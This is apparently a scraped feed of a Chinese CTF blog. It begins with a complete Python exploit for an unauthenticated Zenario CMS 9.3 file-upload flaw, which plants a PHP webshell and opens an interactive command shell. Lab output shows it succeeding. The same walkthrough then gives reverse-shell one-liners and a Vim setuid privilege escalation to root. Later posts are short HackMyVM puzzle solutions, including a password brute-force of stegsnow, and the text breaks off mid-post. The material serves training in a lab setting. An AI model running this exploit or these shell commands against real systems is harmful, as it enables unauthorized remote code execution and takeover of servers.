# Date: 2025-07-19
# Description: This script exploits an unrestricted file upload vulnerability in
# Zenario CMS 9.3. The vulnerability is triggered by a typo in the Content-Type
# header (`Content-Tyope`) which bypasses the file type validation, allowing
# the upload of a PHP webshell.

import requests
import argparse
import sys
import json
from urllib.parse import urljoin

# 关闭requests库因证书验证失败而产生的警告
requests.packages.urllib3.disable_warnings()

def print_banner():
    '''打印一个漂亮的横幅'''
    print('=' * 60)
    print(' Zenario CMS 9.3 Unauthenticated RCE Exploit (CVE-2022-44136)')
    print('=' * 60)

def exploit(target_url, instance_id, filename):
    '''执行漏洞利用的核心函数'''
    
    endpoint = '/zenario/ajax.php'
    upload_url = urljoin(target_url, endpoint)

    # Webshell的内容
    webshell_content = b'&lt;?php echo '&gt;&gt;&gt;'; system($_GET['cmd']); echo '&lt;&lt;&lt;'; ?&gt;'

    # URL查询参数，与截图中保持一致
    params = {
        'method_call': 'handlePluginAJAX',
        'cID': '1',
        'slideId': '0',
        'cType': 'html',
        'instanceId': instance_id,
        'fileUpload': ''
    }

    # 这是要上传的文件。我们先正常定义它。
    # ('fileUpload', (filename, webshell_content, 'image/jpeg'))
    #  ^--表单字段名      ^--文件名   ^--文件内容      ^--一个无害的Content-Type
    files = {
        'fileUpload': (filename, webshell_content, 'image/jpeg')
    }

    print(f'[*] 准备向 {upload_url} 上传webshell...')
    print(f'[*] 使用 Instance ID: {instance_id}')
    print(f'[*] 上传文件名: {filename}')

    # --- 关键的绕过步骤 ---
    # 1. 使用requests库准备一个请求对象，但先不发送
    session = requests.Session()
    req = requests.Request('POST', upload_url, params=params, files=files)
    prepared_req = req.prepare()

    # 2. prepared_req.body是bytes类型，包含了整个multipart/form-data的内容
    #    我们将其解码为字符串，进行替换操作，然后再编码回去
    body_str = prepared_req.body.decode('utf-8', errors='ignore')

    # 3. 将 'Content-Type' 替换为 'Content-Tyope'，这是漏洞的核心
    modified_body_str = body_str.replace('Content-Type: image/jpeg', 'Content-Tyope: image/svg+xml')
    prepared_req.body = modified_body_str.encode('utf-8')
    
    # 4. 更新Content-Length头，因为我们的修改可能导致长度变化（尽管这里没有）
    prepared_req.headers['Content-Length'] = str(len(prepared_req.body))

    print('[+] 请求已被修改，注入 'Content-Tyope' 绕过代码。')
    print('[*] 正在发送恶意请求...')

    try:
        # 5. 发送我们手动修改过的请求
        response = session.send(prepared_req, verify=False, timeout=15)

        # 检查响应是否成功
        if response.status_code == 200:
            print('[+] 服务器返回 200 OK，可能上传成功！')
            try:
                # 解析服务器返回的JSON
                response_json = response.json()
                file_path = response_json['files'][0]['path']
                
                # 构建完整的webshell URL
                webshell_url = urljoin(target_url, f'{file_path}')
                print('\n' + '='*60)
                print(f'[\033[1;32mSUCCESS\033[0m] Webshell上传成功!')
                print(f'[\033[1;32mURL\033[0m]: {webshell_url}')
                print('='*60 + '\n')
                return webshell_url
            except (json.JSONDecodeError, KeyError, IndexError):
                print('[-] 上传成功，但无法从响应中解析文件路径。')
                print('[-] 响应内容: ', response.text)
                return None
        else:
            print(f'[-] 上传失败，服务器返回状态码: {response.status_code}')
            return None

    except requests.exceptions.RequestException as e:
        print(f'[-] 请求发生错误: {e}')
        return None

def interactive_shell(webshell_url):
    '''提供一个交互式的命令执行环境'''
    print('[*] 启动交互式Webshell... (输入 'exit' 退出)')
    session = requests.Session()
    try:
        while True:
            cmd = input('\033[1;34mcmd &gt; \033[0m')
            if cmd.lower() in ['exit', 'quit']:
                break
            
            # 发送GET请求来执行命令
            params = {'cmd': cmd}
            try:
                response = session.get(webshell_url, params=params, verify=False, timeout=10)
                # 提取由 '&gt;&gt;&gt;' 和 '&lt;&lt;&lt;' 包裹的命令输出
                output = response.text.split('&gt;&gt;&gt;')[1].split('&lt;&lt;&lt;')[0]
                print(output)
            except requests.exceptions.RequestException as e:
                print(f'[-] 命令执行失败: {e}')
            except IndexError:
                 print(f'[-] 无法从响应中提取命令输出。')
                 print(f'[-] 原始响应: {response.text}')


    except KeyboardInterrupt:
        print('\n[*] 检测到Ctrl+C，正在退出。')
    print('[*] Webshell会话已关闭。')


if __name__ == '__main__':
    print_banner()
    parser = argparse.ArgumentParser(description='Zenario CMS 9.3 RCE (CVE-2022-44136) Exploit')
    parser.add_argument('target_url', help='目标URL (例如: http://192.168.205.128:8000)')
    parser.add_argument('--instance-id', default='20', help='文件上传表单的instanceId (默认为20)')
    parser.add_argument('--filename', default='shell.php', help='上传的webshell文件名 (默认为shell.php)')
    
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)
        
    args = parser.parse_args()
    
    shell_url = exploit(args.target_url, args.instance_id, args.filename)
    
    if shell_url:
        interactive_shell(shell_url)
    else:
        print('\n[-] 漏洞利用失败，未能获取Webshell。')
                                           
```

执行利用脚本：

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ python3 exp.py http://192.168.205.128:8000                            
============================================================
 Zenario CMS 9.3 Unauthenticated RCE Exploit (CVE-2022-44136)
============================================================
[*] 准备向 http://192.168.205.128:8000/zenario/ajax.php 上传webshell...
[*] 使用 Instance ID: 20
[*] 上传文件名: shell.php
[+] 请求已被修改，注入 'Content-Tyope' 绕过代码。
[*] 正在发送恶意请求...
[+] 服务器返回 200 OK，可能上传成功！

============================================================
[SUCCESS] Webshell上传成功!
[URL]: http://192.168.205.128:8000/private/uploads/JEk-Wwl_SpBQMaPvCw3mgBcAB1m7bw/shell.php
============================================================

[*] 启动交互式Webshell... (输入 'exit' 退出)
cmd &gt; id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

脚本成功上传了一个PHP webshell，并获得了 `www-data` 用户的命令执行权限。

# 三、初始访问与本地枚举

## 1. 反弹 Shell

为了获得更稳定的交互式会话，在攻击机上设置 Netcat 监听，并从 webshell 中执行反弹 shell 命令。

**攻击机监听:**

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 8888
```

**Webshell 中执行:**

```bash
cmd &gt; busybox nc 192.168.205.128 8888 -e /bin/bash
```

成功获得 `www-data` 用户的反弹 shell，并升级为标准的 TTY。

```
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm  
export TERM=xterm  
export SHELL=/bin/bash  
stty rows 24 columns 80
```

## 2. 本地信息收集

在 `/home` 目录下发现用户 `morii`，并在其家目录下找到并读取了 `user.txt` 文件。

```
www-data@Rabb1t:/home/morii$ ls -al
...
-rw-r--r-- 1 morii morii   32 Jul 17 11:09 user.txt
www-data@Rabb1t:/home/morii$ cat user.txt 
flag{user_Down the Rabbit-Hole}
```

# 四、权限提升

## 1. SUID/Capabilities 权限检查

对系统进行权限提升向量的排查。`find` 命令查找 SUID 文件，但未发现明显可利用的异常文件。接着使用 `getcap` 检查文件的 Capabilities。

```
www-data@Rabb1t:/home/morii$ getcap -r / 2&gt;/dev/null
/usr/bin/vim = cap_setuid+ep
...
```

发现 `/usr/bin/vim` 被授予了 `cap_setuid+ep` 权限。这意味着 Vim 进程可以调用 `setuid()` 系统调用来改变其有效用户ID (EUID)。

## 2. 利用 Vim Capabilities 提权

检查 Vim 的编译选项，确认其是否支持可用于执行代码的脚本接口。

```
www-data@Rabb1t:/home/morii$ vim --version
...
-python            -python3           +ruby              
...
```

结果显示，虽然 Python 接口被禁用了，但 **Ruby (`+ruby`)** 接口是启用的。我们可以利用 Vim 的 Ruby 接口，结合 `cap_setuid` 权限来执行代码并提权至 root。

**提权步骤：**

1. 在攻击机上开启 Netcat 监听以接收 root shell。

   ```bash
   nc -lvnp 8888
   ```

2. 在靶机上执行一条精心构造的 Vim 命令。该命令利用 Ruby 接口首先将进程的 EUID 设置为 0 (root)，然后执行一个反弹 shell 命令。

   ```bash
   vim -c ':ruby Process::Sys.setuid(0); exec('busybox nc 192.168.205.128 8888 -e /bin/bash')'
   ```

攻击机成功接收到连接，获得了一个 `euid=0` 的 root 权限 shell。

# 3. 获取最终凭证

在 root shell 中，读取 `/root` 目录下的最终 flag 文件。

```bash
root@Rabb1t:/home/morii# id
uid=0(root) gid=33(www-data) groups=33(www-data)
root@Rabb1t:/home/morii# cat /root/root.txt /home/morii/user.txt 
flag{root_Alice’s Evidence}
flag{user_Down the Rabbit-Hole}
```

至此，渗透测试完成，成功获取了系统的 root 权限。sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Rabb1t.html</guid><pubDate>Sun, 20 Jul 2025 06:33:40 +0000</pubDate></item><item><title>Challenge 063</title><link>https://7r1UMPHK.github.io/post/Challenge%20063.html</link><description>![image-20250718221751985](https://7r1umphk.github.io/image/20250718221752208.webp)

https://hackmyvm.eu/challenges/challenge.php?c=063

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -la        
总计 4655
drwxr-xr-x 1 kali kali    4096  7月18日 10:10 .
drwxr-xr-x 1 kali kali    8192  7月17日 23:37 ..
-rwxr-xr-x 1 kali kali 2377257 2023年 1月10日 062.png
-rwxr-xr-x 1 kali kali 2375882  7月18日 10:10 062.zip
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -al 063.zip 
-rwxr-xr-x 1 kali kali 431  7月18日 10:18 063.zip
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z x 063.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 431 bytes (1 KiB)

Extracting archive: 063.zip
--
Path = 063.zip
Type = zip
Physical Size = 431

Everything is Ok

Size:       671
Compressed: 431
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -al        
总计 14
drwxr-xr-x 1 kali kali 4096  7月18日 10:18 .
drwxr-xr-x 1 kali kali 8192  7月17日 23:37 ..
-rwxr-xr-x 1 kali kali  671 2024年 1月24日 063.txt
-rwxr-xr-x 1 kali kali  431  7月18日 10:18 063.zip
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat 063.txt
In the script's silent dance, spaces weave,                              
A hidden language, easy to deceive.                                          
Between the lines, where eyes might stray,                            
The secret dwells in whitespace's play.                                
                                                                           
Embrace the gaps, where silence gleams,                                    
Decode the whispers in code's dreams.                                    
In every blank, a story told,                                              
For beginners bold, a mystery unfolds.                                      
                                                                            
                                                                           
                                                                            
           
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat -A 063.txt 
In the script's silent dance, spaces weave,^I   ^I  ^I       ^I $
A hidden language, easy to deceive.       ^I     ^I   ^I  ^I     $
Between the lines, where eyes might stray, ^I      ^I ^I      $
The secret dwells in whitespace's play.^I       ^I     ^I     ^I       $
^I    ^I   ^I^I      ^I  ^I  ^I       ^I ^I   $
Embrace the gaps, where silence gleams, ^I   ^I ^I      ^I   $
Decode the whispers in code's dreams. ^I  ^I      ^I  ^I       ^I $
In every blank, a story told, ^I  ^I     ^I   ^I ^I       ^I   $
For beginners bold, a mystery unfolds.   ^I     ^I  ^I  ^I    $
       ^I       ^I    ^I    ^I     ^I     ^I  ^I   ^I     ^I    $
  ^I      ^I^I      ^I ^I^I   ^I ^I   ^I   $
^I       ^I  ^I  ^I    ^I    ^I     ^I    ^I     ^I    $
  ^I   $
                            
```

对空白比较敏感

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ stegsnow 063.txt 
��r��=�^i��5�WO�H�M�R�pi��M+                                                                                                                                                                               
```

看样子有加密，去扒拉一个爆破
https://github.com/cyberpoul/StegsnowBruteForcer

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$git clone https://github.com/cyberpoul/StegsnowBruteForcer.git
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cd StegsnowBruteForcer
                                                                                       
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/StegsnowBruteForcer]
└─$ source ~/pythonvenv/bin/activate
                             
┌──(pythonvenv)─(kali㉿kali)-[/mnt/…/gx/x/tmp/StegsnowBruteForcer]
└─$ pip install -r requirements.txt

┌──(pythonvenv)─(kali㉿kali)-[/mnt/…/gx/x/tmp/StegsnowBruteForcer]
└─$ python stegsnowbruteforcer.py --file ../063.txt --wordlist /usr/share/wordlists/rockyou.txt --keyword HMV{ --output results.txt 

***********************************************************
*                                                         *
*         Stegsnow Password Brute-Force Attack            *
*                    made by Assa                         *
*     https://github.com/Assa228/StegsnowBruteForcer      *
*                                                         *
***********************************************************

  0%|                                | 480/14344392 [00:12&lt;23:06:27, 172.43it/s]
Keyword 'HMV{' found with the password: letmein
Here is the decoded message:
HMV{wh1t3_sp4c3_st3g_15_fu/\/}
  0%|                               | 6394/14344392 [00:19&lt;12:25:36, 320.50it/s]^C

```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20063.html</guid><pubDate>Fri, 18 Jul 2025 14:57:48 +0000</pubDate></item><item><title>Challenge 062</title><link>https://7r1UMPHK.github.io/post/Challenge%20062.html</link><description>![image-20250718220920924](https://7r1umphk.github.io/image/20250718220921171.webp)

https://hackmyvm.eu/challenges/challenge.php?c=062

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -la 062.zip 
-rwxr-xr-x 1 kali kali 2375882  7月18日 10:10 062.zip
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z x 062.zip     

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 2375882 bytes (2321 KiB)

Extracting archive: 062.zip
--
Path = 062.zip
Type = zip
Physical Size = 2375882

Everything is Ok

Size:       2377257
Compressed: 2375882
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -la        
总计 4655
drwxr-xr-x 1 kali kali    4096  7月18日 10:10 .
drwxr-xr-x 1 kali kali    8192  7月17日 23:37 ..
-rwxr-xr-x 1 kali kali 2377257 2023年 1月10日 062.png
-rwxr-xr-x 1 kali kali 2375882  7月18日 10:10 062.zip
                                     
```

![image-20250718221100328](https://7r1umphk.github.io/image/20250718221101047.webp)

现在看到飞机就烦，之前解那个机场那个到现在都没搞明白

看到有一个条码还是完整的，找个条码扫描，扫扫

https://www.1txm.com/barcodeDecode

![image-20250718221717097](https://7r1umphk.github.io/image/20250718221717466.webp)

```
HMV{1_l0v3_c0d3_128}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20062.html</guid><pubDate>Fri, 18 Jul 2025 14:57:36 +0000</pubDate></item><item><title>Challenge 061</title><link>https://7r1UMPHK.github.io/post/Challenge%20061.html</link><description>![image-20250718215535991](https://7r1umphk.github.io/image/20250718215536221.webp)

https://hackmyvm.eu/challenges/challenge.php?c=061

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -la 061.zip 
-rwxr-xr-x 1 kali kali 435  7月18日 09:55 061.zip
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z x 06*.zip

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 435 bytes (1 KiB)

Extracting archive: 061.zip
--
Path = 061.zip
Type = zip
Physical Size = 435

Everything is Ok

Size:       430
Compressed: 435
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -al        
总计 13
drwxr-xr-x 1 kali kali 4096  7月18日 09:56 .
drwxr-xr-x 1 kali kali 8192  7月17日 23:37 ..
-rwxr-xr-x 1 kali kali  430 2024年 1月24日 061.txt
-rwxr-xr-x 1 kali kali  435  7月18日 09:55 061.zip
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat 061.txt
UEsDBC0AAgAIALySN1jMnd4u//////////8BABQALQEAEAA4BQAAAAAAAHgAAAAAAAAArVPJDcAg
DFvJ3n+58mih5G6KhGQBVi7HAAmMsyEWciAh/ieP877xnnfIeBmfimfW4cZf/2HdL4z7S3hZXlUn
a3Og5v+KW9XXzY/ePGW8sp7s7Ve1Dq+vbG9P6WDse+yH4vwMf7byez5HU192dT3kl89+pdvfzb8A
UEsBAh4DLQACAAgAvJI3WMyd3i54AAAAOAUAAAEAAAAAAAAAAQAAAIARAAAAAC1QSwYGLAAAAAAA
AAAeAy0AAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAALwAAAAAAAACrAAAAAAAAAFBLBgcAAAAA2gAA
AAAAAAABAAAAUEsFBgAAAAABAAEALwAAAKsAAAAAAA==
                                    
```

https://gchq.github.io/CyberChef/

![image-20250718215743580](https://7r1umphk.github.io/image/20250718215743873.webp)

PKZIP压缩文件

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z x 061b.zip -oa           

┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -la a      
总计 6
-rwxr-xr-x 1 kali kali 1336 2024年 1月23日 -
drwxr-xr-x 1 kali kali    0  7月18日 10:01 .
drwxr-xr-x 1 kali kali 4096  7月18日 10:01 ..
```

神人

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat a/-                   
0011001000110010001100000011000001110100001100100011001000110001001100100111010000110001001100000011000000110001001100100111010000110001001100010011000100110010001100000111010000110001001100000011000000110000001100010111010000110010001100100011001000110010011101000011001000110010001100000011001001110100001100100011000000110000001100010111010000110001001100000011000100110001001100100111010000110001001100100011000100110001011101000011000100110000001100010011000100110010011101000011001000110010001100000011000001110100001100010011001000110001001100000111010000110010001100100011001000110010011101000011000100110010001100100011000001110100001100010011000000110001001100010011001001110100001100010011000000110000001100100011001001110100001100010011001000110001001100000111010000110001001100000011000000110001001100010111010000110001001100000011000100110001001100100111010000110010001100010011000100110001011101000011000100110001001100000011001000110000011101000011000100110010001100100011000101110100001100100011000100110001001100010111010000110010001100100011000100110000011101000011000100110010001100100011000001110100001100100011000100110001001100100111010000110001001100000011000100110001001100100111010000110001001100100011000100110001011101000011001000110000001100000011000101110100001100010011000100110001001100100011001001110100                                                         
```

![image-20250718220535012](https://7r1umphk.github.io/image/20250718220535314.webp)

解出一个三进制，t为分隔符

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cat a.py 
s = '2200t2212t10012t11120t10001t2222t2202t2001t10112t1211t10112t2200t1210t2222t1220t10112t10022t1210t10011t10112t2111t11020t1221t2111t2210t1220t2112t10112t1211t2001t11122t'
nums = s.strip('t').split('t')
flag = ''.join(chr(int(n, 3)) for n in nums)
print(flag)
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ python3 $_               
HMV{RPJ7_1_H0P3_Y0U_Cr4CK3D_17}
                          
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20061.html</guid><pubDate>Fri, 18 Jul 2025 14:57:26 +0000</pubDate></item><item><title>Challenge 060</title><link>https://7r1UMPHK.github.io/post/Challenge%20060.html</link><description>![image-20250718215028063](https://7r1umphk.github.io/image/20250718215056695.webp)

https://hackmyvm.eu/challenges/challenge.php?c=060

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -la 060.zip 
-rwxr-xr-x 1 kali kali 5795  7月18日 09:51 060.zip
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z x 060.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 5795 bytes (6 KiB)

Extracting archive: 060.zip
--
Path = 060.zip
Type = zip
Physical Size = 5795

Everything is Ok

Size:       23103
Compressed: 5795
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -la        
总计 1424
drwxr-xr-x 1 kali kali    4096  7月18日 09:51 .
drwxr-xr-x 1 kali kali    8192  7月17日 23:37 ..
...
-rwxr-xr-x 1 kali kali   23103 2024年 1月22日 060.txt
-rwxr-xr-x 1 kali kali    5795  7月18日 09:51 060.zip
...
    
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ head -n 10 060.txt
G90
G20
G17 G64 P0.001 M3 S3000
F5.00
G0 Z0.2500
G0 X0.1329 Y0.0000
G1 Z-0.0010 F0.10
G1 X0.1329 Y0.0000F5.00
G1 Y0.0946
G1 X0.0536
```

G-code 学机床的应该很熟，哈哈哈

https://ncviewer.com/

![image-20250718215438894](https://7r1umphk.github.io/image/20250718215439411.webp)

```
HMV{engraving_a_trophy_for_Kerszi}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20060.html</guid><pubDate>Fri, 18 Jul 2025 14:57:14 +0000</pubDate></item><item><title>Challenge 059</title><link>https://7r1UMPHK.github.io/post/Challenge%20059.html</link><description>![image-20250718211403641](https://7r1umphk.github.io/image/20250718211403851.webp)

https://hackmyvm.eu/challenges/challenge.php?c=059

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z x 059.zip 

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 1340043 bytes (1309 KiB)

Extracting archive: 059.zip
--
Path = 059.zip
Type = zip
Physical Size = 1340043
Comment = 67f1eeaca308318257ec4f222b4315741738d456

Everything is Ok

Folders: 22
Files: 120
Size:       3143617
Compressed: 1340043
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -al
总计 1395
drwxr-xr-x 1 kali kali    4096  7月18日 09:14 .
drwxr-xr-x 1 kali kali    8192  7月17日 23:37 ..
-rwxr-xr-x 1 kali kali   35450  7月18日 09:05 058.zip
-rwxr-xr-x 1 kali kali 1340043  7月18日 09:14 059.zip
-rwxr-xr-x 1 kali kali   35280 2023年12月28日 challenge.png
drwxr-xr-x 1 kali kali    4096 2024年 1月 4日 h1ker-main
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ cd h1ker-main 
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/h1ker-main]
└─$ ls -al
总计 75
drwxr-xr-x 1 kali kali  4096 2024年 1月 4日 .
drwxr-xr-x 1 kali kali  4096  7月18日 09:14 ..
drwxr-xr-x 1 kali kali  4096 2024年 1月 4日 admin
-rwxr-xr-x 1 kali kali  8554 2024年 1月 4日 aerocms.sql
-rwxr-xr-x 1 kali kali  2411 2024年 1月 4日 author_posts.php
-rwxr-xr-x 1 kali kali   100 2024年 1月 4日 build_docker.sh
-rwxr-xr-x 1 kali kali  3203 2024年 1月 4日 category.php
drwxr-xr-x 1 kali kali     0 2024年 1月 4日 config
drwxr-xr-x 1 kali kali     0 2024年 1月 4日 css
-rwxr-xr-x 1 kali kali   324 2024年 1月 4日 Dockerfile
drwxr-xr-x 1 kali kali  4096 2024年 1月 4日 fonts
drwxr-xr-x 1 kali kali     0 2024年 1月 4日 images
drwxr-xr-x 1 kali kali  4096 2024年 1月 4日 includes
-rwxr-xr-x 1 kali kali  4421 2024年 1月 4日 index.php
drwxr-xr-x 1 kali kali     0 2024年 1月 4日 js
-rwxr-xr-x 1 kali kali 18092 2024年 1月 4日 LICENSE
-rwxr-xr-x 1 kali kali  7812 2024年 1月 4日 post.php
-rwxr-xr-x 1 kali kali  1306 2024年 1月 4日 README.md
-rwxr-xr-x 1 kali kali  3176 2024年 1月 4日 registration.php
-rwxr-xr-x 1 kali kali   369 2024年 1月 4日 run.sh
-rwxr-xr-x 1 kali kali  3039 2024年 1月 4日 search.php
                                                    
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/h1ker-main]
└─$ cat README.md                                        

# H1ker
&lt;p align=center&gt;
&lt;a target='_blank' href='LICENSE' title='License: MIT'&gt;&lt;img src='https://img.shields.io/badge/License-MIT-blue.svg'&gt;&lt;/a&gt;
&lt;a target='_blank' href='AeroCMS' title='AeroCMS'&gt;&lt;img src='https://img.shields.io/badge/cms-latest-purple'&gt;&lt;/a&gt;
&lt;/p&gt;

# AeroCMS
Aero / AeroCMS is a simple and easy to use CMS (Content Management System) designed to create fast and powerful web applications. Aero is built with OOP (Object Oriented Programming) PHP which is known for fast website loading speeds, [AeroCMS](https://github.com/MegaTKC/AeroCMS).


This is a web vulnerability challenge, try to find the flag.
This challenge requires docker.

### Manual Docker image build and run
1. Install [Docker](https://www.docker.com)
2. Build the image `docker build -t h1ker .`
3. Start the container with a port of your choice by replacing 1337 `docker run --name=h1ker -d -p 1337:80 h1ker`
4. The challenge can be found in http://localhost:1337/

### Automated run
Run the following bash script to build and run the challenge `./build_docker.sh`. The challenge can be found in http://localhost:1337/

## Delete challenge
Don't forget to delete both the container and the image of the challenge after you finish:
1. Delete container `docker rm h1ker -f`
2. Delete image `docker rmi h1ker`


Have fun !
       
```

&gt; # H1ker
&gt; &lt;p align=center&gt;
&gt; &lt;a target='_blank' href='LICENSE' title='许可证：MIT'&gt;&lt;img src='https://img.shields.io/badge/License-MIT-blue.svg'&gt;&lt;/a&gt;
&gt; &lt;a target='_blank' href='AeroCMS' title='AeroCMS'&gt;&lt;img src='https://img.shields.io/badge/cms-latest-purple'&gt;&lt;/a&gt;
&gt; &lt;/p&gt;
&gt;
&gt; # AeroCMS
&gt; Aero / AeroCMS 是一款简单易用的 CMS（内容管理系统），旨在创建快速强大的 Web 应用程序。Aero 采用面向对象编程 (OOP) PHP 构建，该语言以快速的网站加载速度而闻名，[AeroCMS](https://github.com/MegaTKC/AeroCMS)。
&gt;
&gt; 这是一个 Web 漏洞挑战，请尝试找到 flag。
&gt; 此挑战需要 Docker 的支持。
&gt;
&gt; ### 手动构建并运行 Docker 镜像
&gt; 1. 安装 [Docker](https://www.docker.com)
&gt; 2. 构建镜像 `docker build -t h1ker`
&gt; 3. 使用您选择的端口启动容器，方法是将 1337 替换为 `docker run --name=h1ker -d -p 1337:80 h1ker`
&gt; 4. 您可以在 http://localhost:1337/ 找到挑战
&gt;
&gt; ### 自动运行
&gt; 运行以下 bash 脚本来构建并运行挑战 `./build_docker.sh`。您可以在 http://localhost:1337/ 找到挑战
&gt;
&gt; ## 删除挑战
&gt; 完成后，请记得删除容器和挑战镜像：
&gt; 1. 删除容器 `docker rm h1ker -f`
&gt; 2. 删除镜像 `docker rmi h1ker`
&gt;
&gt; 祝您玩得开心！

不爱开docker

```
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/h1ker-main]
└─$ grep -r 'HMV{' . 
./admin/categories.php:                            &lt;small&gt;HMV{h1kinG_1s_s0_fUn}&lt;/small&gt;
                          
```

哈哈sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20059.html</guid><pubDate>Fri, 18 Jul 2025 14:57:03 +0000</pubDate></item><item><title>Challenge 058</title><link>https://7r1UMPHK.github.io/post/Challenge%20058.html</link><description>好像好久没打Challenge了，打打

![image-20250718210310881](https://7r1UMPHK.github.io/image/20250718210319612.webp)

https://hackmyvm.eu/challenges/challenge.php?c=058

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -la 058.zip      
-rwxr-xr-x 1 kali kali 35450  7月18日 09:05 058.zip
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ 7z x 058.zip                      

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 35450 bytes (35 KiB)

Extracting archive: 058.zip
--
Path = 058.zip
Type = zip
Physical Size = 35450

Everything is Ok

Size:       35280
Compressed: 35450
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ls -al        
总计 82
drwxr-xr-x 1 kali kali  4096  7月18日 09:05 .
drwxr-xr-x 1 kali kali  8192  7月17日 23:37 ..
-rwxr-xr-x 1 kali kali 35450  7月18日 09:05 058.zip
-rwxr-xr-x 1 kali kali 35280 2023年12月28日 challenge.png
```

![challenge](https://7r1UMPHK.github.io/image/20250718210626732.webp)

像是图形加密

https://www.dcode.fr/symbols-ciphers

找就完事了

D'ni Numerals

解一下密

![image-20250718211005223](https://7r1UMPHK.github.io/image/20250718211005590.webp)

```
HMV{13377331}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20058.html</guid><pubDate>Fri, 18 Jul 2025 14:56:49 +0000</pubDate></item><item><title>内部_chabaidao</title><link>https://7r1UMPHK.github.io/post/nei-bu-_chabaidao.html</link><description>![image-20250717204541576](https://7r1UMPHK.github.io/image/20250717204550270.webp)

下载地址：https://mega.nz/file/If9khB4Y#osVSL5SXMQSUQEicWYFZ3Q5w-lovLyamBD_kfDpuNVI

---

# 一、信息收集与服务探测

## 1. 主机发现

首先，在内网环境中，我们使用 `arp-scan` 来发现同一网段下的存活主机。

```bash
